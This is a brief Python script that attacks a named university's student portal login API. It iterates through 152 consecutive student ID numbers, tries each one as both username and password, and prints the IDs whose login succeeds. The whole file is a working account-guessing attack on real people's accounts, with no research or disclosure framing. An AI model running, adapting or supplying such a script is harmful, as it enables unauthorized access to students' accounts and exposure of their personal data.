import requests     
import numpy as np   
import pandas as pd  
import time          

initial_studak_numer = 6510001
num_of_students = 152
login_url = "https://students.bsuir.by/api/v1/auth/login"
headers = {"Content-Type": "application/json"}

for studak in range(initial_studak_numer, initial_studak_numer + num_of_students):
	json = {"username": str(studak), "password": str(studak)}
	# print(json)
	r = requests.post(login_url, headers=headers ,json=json)
	time.sleep(1)
	if r.json()['loggedIn']:
		print(studak)
